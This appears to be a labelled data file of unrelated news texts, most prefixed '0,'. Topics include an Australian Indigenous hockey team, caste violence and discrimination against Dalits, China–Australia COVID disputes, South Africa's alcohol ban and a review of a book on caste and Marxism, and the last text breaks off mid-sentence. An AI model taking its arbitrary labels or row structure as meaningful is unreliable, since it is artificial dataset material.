Is it similar to anything we've ever seen before? Experts have compared it to the 2003 outbreak of severe acute respiratory syndrome (SARS). The epidemic started in southern China and killed more than 700 people in mainland China, Hong Kong and elsewhere  Share what you think The comments below have been moderated in advance.

0,"When Australian hockey player Michael Burgoyne stepped off the plane in Edmonton on Friday, the 50 C difference in temperature compared to back home was one of the first things he noticed. The 22-year-old is a member of the Kaurna Boomerangs: Australia's first ever Indigenous ice hockey team. The squad, whose players range in age from 13 to early 20s, travelled to Edmonton to take part in a cultural exchange with Cree nations in northern Alberta. On Saturday, the team worked through jet lag during a practice on the rink at Rogers Place. Burgoyne said skating on the Edmonton Oilers' home ice was a ""surreal"" experience, and that its been an adjustment acclimatizing not only to the weather, but also to Canadian culture. ""I rocked up and I got told 'we're in Canada, we don't say ice hockey here, we just say hockey,'"" he said, explaining field hockey is the more popular game in Australia. The Boomerangs were formed and began training two years ago, as part of the Ice Factor program: a longstanding initiative that gets disadvantaged youth involved in hockey. Based out of Adelaide, Australia, Ice Factor was founded by Marie Shaw, whose own daughter had her life turned around after falling in love with the sport. When Shaw heard southern Australia's only ice rink was set for closure, she got involved in efforts to save it, and ended up founding the now 15-year-old organization that has seen 3,000 young people participate, and is connected to 18 Australian high schools. Two years ago, a pair of young Indigenous men approached Shaw about the possibility of forming an Indigenous team. She threw her support behind them, and helped make possible the trip to Canada to play against and connect with Indigenous teams here. ""You need to have a dream, and you need to believe in it,"" she said. Burgoyne, who is Mirning and Narungga, is one of the 18 Indigenous players of the team. He said he was a bit of a ""run-amok"" when he entered high school years ago. He credits the Ice Factor program with helping him to stay motivated and stay the course through school. ""The program has helped me out a lot. I've finished school, I've got a job, got a family,"" he said. The team will gear-up for on-skates events in Edmonton, Maskwacis, and Calling Lake. In the city, they'll visit Amiskwaciy Academy, RCMP K Division, West Edmonton Mall, and bundle up for a skate on at the Ottewell Community League's outdoor rink. The Boomerangs will take in some high level hockey as spectators during their trip: watching the Oil Kings take on the Prince Albert Raiders on Jan. 17, and the Oilers versus the Arizona Coyotes on Jan. 18. The hockey players will fly back to Australia on Jan. 19.

0," The alleged rape and death of a 19-year-old woman has sparked a debate about caste. The alleged rape and subsequent death of a 19-year-old woman in India has again shone a spotlight on caste-based violence against the Dalit community – formerly known as “untouchables”. According to official figures, men from India's upper castes rape ten Dalit women a day. Although the northern state of Uttar Pradesh records the highest number of such cases, caste-based violence and discrimination is prevalent throughout the country and in Indian communities around the world. Dalits make up nearly twenty percent of India's population and were given equal protection under the constitution after independence from Britain. But rights groups say while many Dalits have been able to take advantage of quota systems to move up the economic ladder, violence and discrimination against the community is worsening. The current racial justice movement in the United States is inspiring Dalit activists to be move assertive in speaking up for their rights – but what gains can Dalits expect to make? What is at the core of the discrimination and prejudice against them? And why are Dalit women especially targeted for sexual violence? Ritula Shah and guests discuss the future of Dalits in India.

0,"An Australian mining magnate on Wednesday unveiled a deal to import 10 million coronavirus tests from China to Australia, despite a bitter diplomatic spat between the two countries. Andrew Forrest, head of mining giant Fortescue, said he had used contacts to secure an order for the tests with Chinese genomics firm BGI Group at a significantly lower cost than from rival providers, amid fierce competition. Australia, which has been one of the most successful countries in containing COVID-19, has so far carried out around 500,000 tests in a population of 25 million people. Delivery of the new tests would dramatically improve the country's track-and-trace programme and help build the kind of monitoring needed to reopen the country's economy, said Health Minister Greg Hunt. ""What that says to Australians is we have the supply lines, we have the health capacity and we have the pathway back (to normality),"" he said. The deal comes with Australia and China at loggerheads over the pandemic. China's ruling Communist Party has angrily dismissed Australian calls for an independent investigation into the spread of the disease from the Chinese city of Wuhan. Beijing's ambassador Down Under this week threatened a trade boycott if calls for an investigation continued, leading to a public rebuke by Australian authorities. The deal comes with Australia and China at loggerheads over the pandemic Photo: AFP / Saeed KHAN US Secretary of State Mike Pompeo, who has piled pressure on China over the pandemic, waded into the dispute Wednesday as he sarcastically said that Australia upset Beijing through its ""temerity"" to ask questions. ""Who in the world wouldn't want an investigation of how this happened to the world?"" Pompeo told reporters in Washington. ""The solution to this crisis will come from freedom-loving people around the world. I'm very confident that authoritarian regimes are poorly designed to deal with the kind of crisis that this pandemic has engendered,"" he said. Just hours after the latest verbal volley between Beijing and Canberra, the Chinese consul general in the state of Victoria, Zhou Long, spoke at the announcement of the testing deal -- calling it a tribute to the ""friendship and the cooperation between our two countries"". China had released information related to COVID-19 in an ""open, transparent and responsible manner"", he said. Australia's vast mining industry is deeply reliant on Chinese business and China has depended on Australian resources to fuel its rapid economic and infrastructure development. Forrest said his Minderoo Foundation had set aside Aus$320 million ($210 million) to assist the project, which will eventually be paid back by the taxpayer. Australia has confirmed more than 6,700 COVID-19 infections and 90 deaths, with the number of new cases falling below 20 per day for the past week. Prime Minister Scott Morrison on Wednesday said the country was ""not too far away"" from easing social-distancing measures in place for more than a month."

Hood climbed up the ladder of success in the company from heading subsidiary FedEx Truckload Brokerage to obtaining an officer position at FedEx Supply Chain in 2016. She then returned to FedEx Custom Critical for an executive position. She holds a bachelor’s degree in Business Management from Walsh University and Executive MBA from Case Western Reserve University. In the early days as CEO, Hood is looking to gain useful insight from employees, customers and independent contractors driving for Custom Critical. She has created her famous “Ramona Roundtables,” which she is wrapping up this month and involved her talking with small groups of employees. “The next thing I’ll be doing is going out and spending time with customers and independent contractors,” Hood said. “I’m defining that as my ‘listen and learn tour.’ She also mentions that under her leadership, Custom Critical will be agile in addressing customer needs and using technology, all while “looking at things in ways we haven’t in the past.” !function(n){if(!window.cnx){window.cnx={},window.cnx.cmd=[];var t=n.createElement('iframe');t.display='none',t.onload=function(){var n=t.contentWindow.document;c=n.createElement('script'),c.src='//cd.connatix.com/connatix.player.js',c.setAttribute('async','1'),c.setAttribute('type','text/javascript'),n.body.appendChild(c)},n.head.appendChild(t)}}(document); cnx.cmd.push(function() { cnx({ playerId: '6edb1640-7c53-4aaa-b923-9309b1053298' }).render('20a8b375791e4747b3ea338f8ab6c52e'); });  EVENTSWomen of Power SummitEntrepreneurs SummitBlack Men XCELWomen of Power TECH PODCASTSSistersInc.Your Money, Your Life LATEST LISTSBE 100sB.E.

In separate announcements, the Democratic presidential contenders' campaigns said they exercised caution about holding large public gatherings after hearing guidance from public health officials. Both the Sanders and Biden campaigns thanked supporters who planned to attend the events on a crucial day in the race to decide who faces President Donald Trump in November. In a statement, Sanders communications director Mike Casca said the Vermont senator's campaign will evaluate future events ""on a case by case basis."" Biden communications director Kate Bedingfield said the campaign will ""make announcements about future events in the coming days."" The Democratic front-runner plans to deliver remarks at the National Constitution Center in Philadelphia at 9:30 p.m. ET. Asked Tuesday about Trump's plans for future rallies, Vice President Mike Pence said the campaign would make decisions ""literally on a day to day basis."" He added that he is confident the campaign ""will take the very best information and make the very best decision going forward."" The cancellations come at a pivotal time for the rivals jockeying for position in the Democratic primary. Six states, including crucial Michigan, hold presidential nominating contests on Tuesday as Biden tries to amass enough delegates to pull the Democratic nomination out of Sanders' reach. Ohio, which awards a significant 136 pledged delegates, votes next week. Read more: Biden and Sanders' fight over trade is a war for the future of the Democratic Party Questions have swirled about when the outbreak would affect a closely watched and consequential Democratic primary. Mass gatherings where the virus could spread make up a core part of Sanders' strategy. Biden relies less on rallies than his rival. Washington state, one of the areas in the U.S. most affected by the outbreak, holds its primary on Tuesday. While voters cast ballots by mail and will not physically go to the polls and risk spreading coronavirus, the state told voters not to lick envelopes.

0,"Australia is continuing to demand an inquiry into the origins of coronavirus, staring down a dramatic escalation in diplomatic tensions with China. Ambassador Cheng Jingye has floated a Chinese consumer boycott of Australian products, including agriculture, education and tourism, in response to the probe. Advertisement The Chinese embassy also controversially released details of a private conversation with Australia's top diplomat. Chinese state media have launched a series of scathing attacks, with one likening Australia to gum stuck to the bottom of China's shoe. With relations in the doldrums, Prime Minister Scott Morrison is refusing to back down on his push for a global coronavirus inquiry. ""We will, of course, continue to support moves to ensure there is a proper independent assessment of what has occurred here,"" he said on Wednesday. ""It is not a remarkable position. It is a fairly common sense position and one that we don't resile from."" Mr Morrison said he would keep up the pressure for an investigation ahead of a World Health Assembly meeting next month. Advertisement China released details of Mr Cheng's phone call with Department of Foreign Affairs and Trade secretary Frances Adamson in a major departure from diplomatic convention. After DFAT expressed regret over the release, the Chinese embassy retaliated by accusing Australia of leaking details of the phone call first. ""The embassy of China doesn't play petty tricks, this is not our tradition. But if others do, we have to reciprocate,"" a spokesman said. Home Affairs Minister Peter Dutton said the inquiry was not about China but about arming scientists with tools ""sooner rather than later"". ""If there is any information that is available that would aid those scientific endeavours to try and find a vaccine or an adequate medical response to this virus, then we want that information now,"" he told the ABC. Attorney-General Christian Porter said opposition to an inquiry was irrational, illogical and unreasonable. ""I think that the Chinese ambassador's response was largely emotional and generally speaking, those types of emotional responses are relatively short-lived,"" he told 6PR radio. Labor leader Anthony Albanese echoed the prime minister in downplaying the significance of a coronavirus inquiry. ""I regard as completely unremarkable the idea that there should be an investigation into this,"" he told Sky News. Crossbench senator Rex Patrick will have a sixth crack at establishing a parliamentary inquiry into relations with China when parliament sits next month. ""The ambassador revealed China's true diplomatic face and confirmed concerns about China's preference for control and coercion rather than partnership,"" he said.

0," Follow Us Epaper Login / Register  A - A +  Cisco's treatment of the employee violated the Civil Rights Act of 1964 A - A + Updated At: Jul 02, 2020 05:33 PM (IST) The company said will defend against the allegations in the complaint. Source: Twitter.   New York, July 2 California regulators have sued Cisco Systems, saying an engineer faced discrimination at the company's Silicon Valley headquarters because he is a Dalit Indian. India's caste system long placed Dalits at the bottom of a social hierarchy, once terming them ""untouchables."" Inequities and violence against Dalits have persisted for decades after India banned caste discrimination. The engineer worked on a team at Cisco's San Jose headquarters with Indians who all immigrated to the US as adults, and all of whom were of high caste, according to the lawsuit filed on Tuesday by the California Department of Fair Employment and Housing. The ""higher caste supervisors and co-workers imported the discriminatory system's practices into their team and Cisco's workplace,” the lawsuit says. It says Cisco's treatment of the employee, who is not named, violated the Civil Rights Act of 1964 and California's Fair Employment and Housing Act. The Civil Rights Act bans employment discrimination based on race, color, religion, sex and national origin. The lawsuit notes the employee is Dalit Indian, and that he is darker-complexioned than non-Dalit Indians. ""It is unacceptable for workplace conditions and opportunities to be determined by a hereditary social status determined by birth,” said DFEH Director Kevin Kish. Two men who were Cisco supervisors and higher-caste Indians, Sundar Iyer and Ramana Kompella, are named in the suit for discriminating and harassing the employee. The employee received less pay and fewer opportunities, and when he opposed “unlawful practices, contrary to the traditional order between the Dalit and higher castes, Defendants retaliated against him,” the lawsuit says. Cisco did not step to prevent this discrimination, the suit says. The suit says that Iyer told other workers that the employee was Dalit and enrolled at India's prestigious Indian Institute of Technology through affirmative action. The employee contacted Cisco human relations, wanting to file a discrimination complaint against Iyer, and then Iyer took away his responsibilities and made other changes that reduced the employee's role and made him feel isolated from his coworkers. The suit says Iyer disparaged the employee to coworkers and said they should avoid him. After Iyer stepped down, Kompella replaced him, and the suit says Kompella “continued to discriminate, harass, and retaliate” against the employee, including by “giving him assignments that were impossible to complete under the circumstances.” The lawsuit says that Cisco investigated and did not “substantiate any caste-based or related discrimination or retaliation” against the employee. Cisco Systems Inc., a major supplier of computer networking gear that makes the internet work, said in a statement that it is committed to an inclusive workplace. It said it has “robust processes to report and investigate concerns raised by employees,” which it followed in this case, and that it is in compliance with all laws and its own policies. The company said will defend against the allegations in the complaint. Cisco spokeswoman Helen Saunders declined to say if Iyer and Kompella were still at Cisco, referring a reporter to LinkedIn. — AP Tribune Shorts A - A + What do you think?

0,"Two nine-year-olds were fighting over something inconsequential in district Patna, Bihar. As the fight showed no sign of flagging, the elders of one of the boys, dominant caste as it turned out, decided to get involved. The Dalit boy, after all, had to be shown his place. The men from the dominant caste caught hold of the Dalit boy’s mother. They stripped her and paraded her through the village. The woman’s mother and daughter tried to intervene and were thrashed. Finally, the village sarpanch stepped in and a bystander offered the woman a shawl. An FIR was filed, but the accused got bail. This story was narrated by the woman’s husband at a conference organised in New Delhi by the All India Dalit Mahila Adhikar Manch a few years ago. But the reality of living as a Dalit woman in India hasn’t changed. Tucked inside the newspapers — if at all — it filters through stories of everyday, routine indignities. Somewhere a sarpanch is denied a chair on the podium during a Republic Day function. A bride’s palanquin takes the long route home so as to not pollute the roads that dominant castes tread on. Shopkeepers fling purchases made by Dalit customers. Temples and common water sources are barred. Just another day in the life of a Dalit. The outrage over Hathras is justified and necessary. But there is nothing new about the systemic oppression of Dalit women aided by State-backed institutions: The police who won’t file FIRs, lawyers who urge rape survivors to compromise, a legal system that exhausts the patience of the most stoic victim, and a media that finds no merit in these stories. To say, “don’t make this about caste” is ignorance and privilege. Of course, it is about caste. Of course, there is a power dynamic. Would there have been mere outrage and not a raging lynch mob if four Dalit men had attacked a Thakur woman in a similar fashion? Would the police have locked an upper caste family inside their home and denied them access to their daughter’s cremation? Caste is modern India’s dirtiest little secret. It has a grip so insidious that parents will kill their own daughters for falling in love with men from the “wrong” caste; a grip so normalised that in 2014, India’s biggest caste survey found one in four Indians freely admitted to practising some form of untouchability. Of all the ghastly visuals that emerged from Hathras, the one that broke my heart is the one where the sister-in-law of the 19-year-old Dalit girl is running behind the district magistrate’s official white car as he leaves the village in a plume of dust. An Indian citizen, guaranteed equality by the Constitution, is chasing India’s new rulers like a supplicant in a feudal autocracy, begging for the most basic human right — dignity in death. Or at least an answer. Of course, the car does not stop. Get our daily newsletter Get free access to newsletters, alerts and recommendations"

The flight, operated by China Eastern Airlines, will take nine hours. The flight is the first of a trial service between Shanghai and Perth over the Chinese New Year season, WA Tourism Minister Paul Papalia announced in Shanghai during a tourism forum on Monday. The service will operate each Monday, Wednesday and Friday until February 17. ""Ongoing direct flights between Shanghai and Perth would open up a massive new visitor market,"" said Papalia. ""We want this trial service to become a permanent connection between the two cities and we are in ongoing talks."" ""Direct flights from key markets such as China are critical to growing the state's tourism industry,"" he said. Papalia led a delegation to Shanghai in the lead up to the inaugural flight and met with travel agents and tourism officials. Perth will host a massive Chinese New Year Festival, with celebrations and performances, Papalia announced at the forum. Group tour operators are also preparing to receive Chinese visitors who want to get out and explore destinations that are further away from cities, Papalia added.

0,"Audrey Lee Young's fascination with Disney started out like that of most kids. She grew up on the classic animated films, the memorable characters, and the inspiring storylines. But it wasn't until years later that her fondness would blossom into an obsession, one that inspired her to found a DisneyBound community and visit the theme parks regularly. Flash forward five years, and her sense of community and creativity would extend to a group of women set on changing the way we see Disney princesses. Thus, AfricanPRINTcesses became a reality. I first saw Audrey when she and her fellow royals popped up on my Instagram explore feed. Fourteen women, 14 outfits, 14 new ways of looking at princesses, from Snow White to Vanellope. Over email, Audrey told POPSUGAR she'd been trying to get this idea off the ground for a number of years. ""It was important to see this through because when I came up with the idea, it was literally because our group had run out of black women Disney characters to portray,"" she explained. ""After only TWO projects we had depleted the extent of black female Disney characters (the Muses and Princess Tiana). I said, 'Well if there aren't any more black Disney girls, let's make the Disney girls black.'"" Audrey played around with the idea starting in 2017, but busy schedules and other projects kept it from becoming a reality. Looking back, she thinks this hold-up might have been serendipitous since she had the chance to meet so many other Black women in the DisneyBounding community over the past three years. The group came together (mostly via Instagram), picked their princesses, brainstormed outfits using traditional African prints and fabrics, then decided to plan the big reveal around Black History Month because ""it would make a bigger impact and really showcase the point of the idea."" On Feb. 8, the group — along with photographer Madeline Barr — made their debut, delighting cast members and guests at Disneyland. Mickey Mouse, Donald Duck, Chip, and Dale all stopped for a little time with the princesses. People asked to take their photo. ""At one point we finally had to leave Main Street because there were a lot of people staring and pointing as photos were being taken,"" Audrey said. ""All day guests were commenting on how beautiful and majestic we looked."" Much like how Disney is a beacon to both children and adults alike, I imagine Audrey and her fellow ""PRINTcesses"" will shine as an example to all ages, but especially young women of color. ""For all the little girls out there who still don't see the representation they deserve or who are still told that their black/brown skin and kinky hair are undesirable, you are beautiful princesses. The standard of beauty is YOU! You can be a mermaid, you can be a boss lady, you can be a warrior, you can be an adventurer,"" Audrey said.

0,"University professor Anton Pancev emphasized in an interview Alsat M that Bulgaria in no way denies the identity of the Macedonian people, but defends the identity and history of the Bulgarian people. As for territorial claims, Pancev said that Prime Minister Zoran Zaev may not have territorial claims, but it is VMRO-DPMNE that seeks recognition of the Macedonian minority in Bulgaria. Yes, Prime Minister Zoran Zaev may not be there, but the other main party, VMRO-DPMNE, led by Mr. Mickoski, has categorically said that they will seek recognition of the Macedonian minority in Bulgaria. So, there is a lot of ambiguity among the Macedonian leadership on this issue. Therefore, we talk about the historical facts, it is clear that the idea of Macedonianism was raised since the XIX century by Serbia, by Serbian chauvinist circles, which had a clear national program for Greater Serbia, the eradication of Albanians in Kosovo and Macedonia and the de-Bulgarianization of the Bulgarians in Macedonia. So, there are thousands of documents that prove the success of this Serbian policy in the twentieth century with all the murders, imprisonments of Bulgarians in Macedonia. So, we speak like this with facts, it is well known when the Macedonian language is officially made and actually processed. We must say here that Bulgaria does not deny the identity of these people, they have the right to have languages, histories, figures, personalities and so on. Bulgaria simply protects the identity of Bulgarians and Bulgarian history, Pancev said. Comments are closed for this post. No Related Posts   . © 2018 Republika"

0,"BusinessTech South Africa stands out as a worldwide anomaly by adopting a national ban on alcohol sales as a unique measure to combat the spread of Covid-19 and “flatten the curve”. As history has taught us, banning of alcohol sales and distribution has unintended consequences, such as an increase in illicit liquor trades, says Hellen Ndlovu, director of regulatory & public policy at South African Breweries (SAB). There is a fear that if we don’t learn from the USA prohibition of alcohol (1919 – 1933), these consequences may grow exponentially as the ban remains in place. The sale and production of alcohol was prohibited in the United States between 1919 and 1933 – a historical event commonly known as “The Prohibition”. The US government thought this would discourage people from consuming alcohol, but they were very wrong. What prohibition did do, was allow crime syndicates producing or smuggling booze to flourish, Ndlovu said. South Africa is currently operating under level 4 lockdown regulations, which bans the sale and distribution of alcohol. That will change once the regulations are relaxed to level 3. “The lessons learned from the US Prohibition are eerily relevant when we unpack the unintended consequences the ban on alcohol distribution and sales have had in our country over the last 5 weeks,” Ndlovu said. There is a fear that these consequences may grow exponentially as the ban remains in place if we don’t learn from the prohibition of alcohol in the US. Lessons learned: Lesson 1 – Prohibition puts markets into the hands of criminals Banning alcohol sales doesn’t suddenly remove demand. Banning alcohol simply hands the market to criminals. “South Africa already has a fully functional illegal alcohol market. This illicit liquor trades over R13 billion a year and results in annual tax losses in excess of R6 billion. “As has been widely reported, the ban has offered criminals an unparalleled opportunity to grow their illicit activities which will undoubtedly result in growing losses to both government and the legal alcohol sector,” Ndlovu said. Lesson 2 – Prohibition changes people’s behaviour By banning the legal sale of alcohol, ordinary law abiding citizens become criminals overnight and it changes how they consume alcohol, she said. In the US, consumers switched to more potent drinks and illegal producers – Bootleggers – were incentivised to produce hard liquor rather than beer and wine. During Prohibition, the death rate from acute alcohol poisoning (due to overdose) was more than 30 times higher than it is today. “In South Africa, spirits accounts for the largest share of illicit alcohol volumes, resulting from counterfeiting and substitution/refill activities. Illicit industrial manufacturing is mostly run by very sophisticated, organised criminal cartels concentrating on high-margin products,” Ndlovu said. As South Africans change their drinking behaviour and demand increases for access to more potent alcohol, already existing illicit producers will seize this opportunity to grow their businesses and create a stronghold in the market. “Another risk is the influx of a host of new illicit producers looking to make a quick buck, thereby introducing potentially hazardous substances which could endanger thousands of desperate consumers who normally wouldn’t have taken the risk of purchasing illicit alcohol,” she warned. Lesson 3 – Prohibition diverts law enforcement resources A law that few people agree with requires massive enforcement if government wants it to succeed, said Ndlovu. In the first weeks of the lockdown, South African citizens generally accepted the ban of alcohol sales in light of the initial high levels of uncertainty and turmoil. As time passed, the acceptance and understanding of the purpose of a prolonged ban on alcohol, however faded fast. “In South Africa, the growing illegal sales of all types of alcohol at exorbitant prices and the spike in looting of alcohol stores and storage facilities has been widely reported. “An already strained and exhausted police force is now tasked to deal with additional problems, while the resulting legal battles to deal with these cases will further burden an already overloaded legal system,” said Ndlovu. Lesson 4 – Prohibition almost never works Despite the effort, prohibition failed to end alcohol consumption in the US. “In fact, as we have seen from our own experience during our indefinite lockdown, telling someone they can’t have something, makes them want it even more. The question that requires careful consideration is however, at what cost will people pursue the forbidden fruit?” Where to from here? The regulatory position taken towards alcohol in South Africa has definitely been on the extreme end of the spectrum when compared to lockdown measures put in place by other countries – both on the continent and globally, said SAB. In some countries where bans were instituted the governments quickly reversed them when it became clear that the unintended consequences were worse than the initial perceived threats. Naturally these consequences included spikes in illicit alcohol trade and deaths related to the consumption of unsafe illicit substances, Ndlovu said. “If not addressed soon, the alarming rise in illicit trade, health emergencies and criminal incidents involving alcohol will become a crisis in its own right in South Africa. “By implementing measured concessions now, our government can prevent this matter from becoming an ongoing drain on precious government time and resources in a time where the attention is much more needed elsewhere,” she said. SAB called for a more measured approach to the sale of alcohol, including limiting the amount of alcohol that can be purchased, introducing online sales, trading hour restrictions for stores selling for personal consumption, and opening up sales of lower alcohol by volume (ABV) products only. Sell beer to save jobs The Beer Association of South Africa (BASA) representing the Craft Brewers Association, Heineken and South African Breweries recently called for the ‘off-consumption’ beer trade to resume. The association made a number of submissions to president Cyril Ramaphosa with proposals as to how to ensure the survival of the industry. Some of these include: “We believe our proposal balances both the need to mitigate health risks and preserving the stability of the legal beer industry and our business,” BASA said. “As an association, we have made a commitment to work with SAPS and other law enforcement agencies to take swift action against any traders who do not comply with the regulations,” it said.

Their sheer size is mesmerizing, but it’s their other features that make them one of our favorite animals. They have big floppy ears, long tusks, and of course, their insanely long trunks. Most folks only think of elephant trunks as their nose. However, it turns out that this part of their body is much more complicated. An elephant’s trunk is actually a fusion of their upper lip and nose. It’s used for smelling, breathing, touching, grasping, and making those adorable elephant sounds we all love. This all-purpose snozz even helps elephants eat and drink. And yes, they eat and drink a lot. In fact, the average elephant eats between 100 and 200 pounds of plants every day. And they drink about 30 to 50 gallons of water daily! In couple in South Africa were having a private pool party in 2010, when they had an unexpected visitor stroll in and crash their party. It was a massive male African elephant who decided to come over and help himself to a little drink from their pool. Now, some folks were concerned that the pool was chlorinated. However, the uploader of the video assures us it was not. And besides, I highly doubt the elephant’s sensitive nose would have allowed it to drink from a chlorinated pool. Source: YouTube Watching this graceful animal move is fun to watch, they seem to have such precise control over their trunk, it looks like they could use it to do anything we can do with our hands!

According to multiple reports, a 22-year-old dalit teen was abducted on her way to work, and she returned home late, in a state of a daze and injected with an unknown substance. She had stepped out of her home in the village of Majhauli at 10am to go to Pachpherwa to seek admission in a college. The woman also worked for a local NGO. The area falls under the Gaisadi thana. When she did not get back by 4pm, her family members called her cell phone but the call went unanswered. At 8pm, a rickshaw puller dropped off the woman home. Her mother said, “My child was disabled. Her legs and back were broken. She could neither get up nor speak properly. After some time, she began to complain of extreme discomfort. I kept asking her kya hua, kya hua [what happened]"". The family rushed with her to the district hospital, with a drip attached to her, but she died on the way. The woman’s mother said that two men had injected her with a substance and then taken her to a room. According to the police at 5.30pm, a local youth had asked a doctor to come and treat the woman. When the doctor reached the spot, he found the unconscious woman and refused to treat her till her family was informed. After darkness set in, the man with his accomplice hired a rickshaw to drop the woman back at her home. The rickshaw that brought her home was soaked in blood. Her footwear has also been recovered from the path which the rickshaw took. The woman’s brother has filed a written complaint against two men who have been arrested. Dev Ranjan Verma, the Balrampur Superintendent of Police said that the postmortem did not reveal that the woman’s limbs had been broken. “We have arrested the accused and will complete our investigations quickly. The case will be tried in a fast track court”, he said. Reacting to the incident, Samajwadi Party supremo Akhilesh Yadav said, ""After Hathras, now a daughter was harassed and gangraped in Balrampur. The victim died in serious condition. Condolences! The BJP government should commit no laxity in this case as was done in Hathras and arrest the accused immediately,"" he added with hashtags #Balrampur and #NoMoreBJP on Twitter. Outrage over Hathras case The incident comes close on the heels of the brutal Hathras gangrape. The victim was raped by four upper caste men on September 14 and referred to Safdarjung Hospital, and subsequently AIIMS, in Delhi with spinal injuries, paralysis and cuts in her tongue. The NHRC had issued notices to the Uttar Pradesh government and the state's police chief in connection to the case. The NHRC observed that the young woman belonging to the Scheduled Caste community was subjected to sexual harassment and brutality. ""It is apparent that the police was not able to take timely action to trace and save the victim due to which she could not be saved from being subjected to grave cruelty,"" it said. ""The way the perpetrators have acted shows that they had no fear of law in their mind. The family has suffered an irrevocable loss. A young and a precious human life has been lost,"" the rights panel added. Not only this, there are also allegations made by the family that the ""police forcibly took away the body of the deceased for cremation"" as have been reported in the media, the statement said. A plea was even moved in the Supreme Court on Wednesday seeking directions for handing over the case to the CBI or a Special Investigation Team. Workers of several opposition parties protested in parts of Uttar Pradesh on Wednesday against the gangrape. Congress and Balmiki Samaj members clashed with police at several places in Hathras. Reports of stone-pelting and a motorcycle being set ablaze were also received. State Congress chief Ajay Kumar Lallu led a group of protesters to the chief minister's residence at 5 Kalidas Marg in Lucknow but were stopped by police. Party leader Lalan Kumar said several Congress workers were injured in baton charge by police. ""Lallu was bodily stopped by the policemen, who were deployed in large numbers, and he, along with others, was held and taken to the Eco Garden,"" Kumar said. The Samajwadi party also tried to march to the CM residence but they too were asked to stop and lathicharged, a senior party leader said, accusing the BJP government in Uttar Pradesh of ""suppressing the democratic rights"" of opposition parties. -Inputs from agencies 📣 The Week is now on Telegram.

0,"Painting by Mr. Siddesh Gautam By Kunal Chattopadhyay Anand Teltumbde is a man of many shades. A senior professor at the Goa Institute of Management who identifies as a Marxist, Teltumbde has multiple qualifications: a degree in engineering from Nagpur’s Visvesvaraya National Institute of Technology, a management degree from the Indian Institute of Management Ahmedabad, and a doctorate in cybernetics from the University of Mumbai. But his public persona is that of a Dalit writer and intellectual, and a long-time activist concerned with Dalit and civil-liberties issues. In his long-running column for the Economic and Political Weekly, Teltumbde has often been critical of India’s existing Dalit leadership. He recently turned seventy in a Mumbai prison, having been taken into police custody three months earlier under preposterous terrorism-related charges filed by the National Investigation Agency. His book Republic of Caste is a collection of essays, reworked for publication, that take up a set of key issues concerning the relationship between caste and class, and assesses where Dalits stand today. Teltumbde develops his own perspective on Dalit emancipation through a critique of India’s mainstream communist and Ambedkarite political movements. In a chapter on the relationship between Marxism and the Ambedkarite movements, Teltumbde explores the gulf between two currents that should be allies, but are quite often hostile to each other. The overwhelming majority of Dalits are working class, or rural proletarians and semi-proletarians. But there has been very little serious collaboration between the Dalit liberation movements and the Indian left. Teltumbde argues that Marx was aware of caste as a major impediment to India’s progress; both he and Lenin stressed the need for Marxists to focus on objective reality. He criticizes the approach of the Indian communists to the caste question, which was shaped by two factors: practical and intellectual. One was the fact that the bulk of left-wing leaders were upper caste. An unconscious Brahminism made them ignore the special oppression of Dalits. At a theoretical level, they sought to explain caste — or explain it away — through a crude application of Marx’s base-superstructure metaphor. Their problem in making sense of India’s caste system was similar to the one facing Marxists in other parts of the world when dealing with questions of race, ethnicity, or gender — forms of social oppression that cannot simply be subsumed under a reductionist class approach. As Teltumbde shows, Dr B. R. Ambedkar, the most influential leader of the struggle for Dalit emancipation, demonstrated the possibility of class- and caste-based movements coming together. He tried to organize trade unions, formed an Independent Labour Party (ILP, named after the British party of the same name), and urged the communist-led Girni Kamgar Union to address the question of caste segregation in employment, which would help foster class unity on terms favorable to the most oppressed groups. It is India’s communist organizations that Teltumbde indicts. Over the last thirty years or so, different sectors of the communist movement — using that term in the widest possible sense — have concerned themselves with Dalits and made demands relevant to their social condition. However, there remains a strong belief among them that caste as a special oppression can be solved within the limits of capitalism, through some sort of equalization process. Teltimbde appears to side partly with radicals within the left-wing movements who want to overturn capitalism, and partly with Dalits who argue that caste oppression must be integral to any fight for emancipation. But he does so within a Marxist framework, suggesting that Marxists should see class unity as something that develops through a struggle against an enemy class, rather than as a pre-existing reality around which a movement can be built. In the course of that struggle, there will always be differences that have to be addressed and negotiated. However, the points missing from his argument, or the simplifications that he makes, prevent him from proceeding further in his critique of India’s several communist parties. One such factor should be stressed here. The bulk of the communist movement in India falls into one of two camps. First of all, there are those advocating for a basically parliamentary road, however dressed up with revolutionary rhetoric it may be. They are committed to a two-stage theory of revolution, according to which the enemy in the first stage is imperialism, semi-feudalism, and only particular sections of capital, rather than capitalism as such. Second of all, there are those advocating for a Maoist-style revolution rooted in the countryside, favoring insurrection over parliamentary politics, but also see imperialism, semi-feudalism, and comprador capitalists as the enemy. The section of the far left which is oriented towards the urban working class and mass struggle is much smaller, and its arguments have very little impact on the political scene. As a result, Indian Marxist analysis of caste has most often related to the problem of “semi-feudalism.” This means that a blindness to caste divisions within the working class has persisted, because they have trouble perceiving caste as something that survives under modern capitalism, rather than as a relic of semi-feudal conditions. Even when Marxists formally acknowledged that such divisions exist, they do not take seriously the need for strategies to combat them in order to unify the class. As Teltumbde himself points out, if the communist movement had taken caste seriously from the beginning, a separate Dalit movement should not have been necessary. Teltumbde also takes a critical look at Dr Ambedkar himself, and those who claim the mantle of Ambedkarism. He examines Ambedkar’s philosophical pragmatism, relating it to his teacher John Dewey, and presents Ambedkar as a kind of Fabian socialist. This explains his attitude to Marxian communism — critical of their methods, while sometimes sympathetic to certain goals. In the 1930s, when Ambedkar believed that reform within Hinduism to ensure equality for Dalits was not possible, he turned to class as a category, launching the Independent Labour Party (ILP). But the actual ILP candidates put up in the elections of 1937 mostly came from the Mahar sub-caste among Dalits: it was unable to attract support from other sections of the working class, even among Dalits, showing the gap between the party’s ambition and its achievement. Later, in 1946, when Ambedkar proposed a model of state socialism in the tract “States and Minorities,” he again came to use the language of class, although he wrote the treatise itself on behalf of the United Scheduled Castes Federation. Ambedkar’s differences with the communists also included his approach to the state, and to education. He was opposed to any violent revolution, hoping for change without bloodshed, and expected the educated middle-class intelligentsia to take the lead. In spite of these differences, Teltumbde suggests, Marxism remained a reference point for Ambedkar, even if it was only to argue that his methods were better than those of the Marxists. This implies that he saw the Marxists as his competitors, albeit inferior ones. One conflict zone between them was in Bombay, where both Ambedkar and the communists were active. In the city’s textile mills, communists dominated the powerful union for half a century. Dalits found themselves debarred from jobs in the better-paid weaving section, as the non-Dalit workers believed they would be polluted if they touched threads that Dalits had woven. As late as 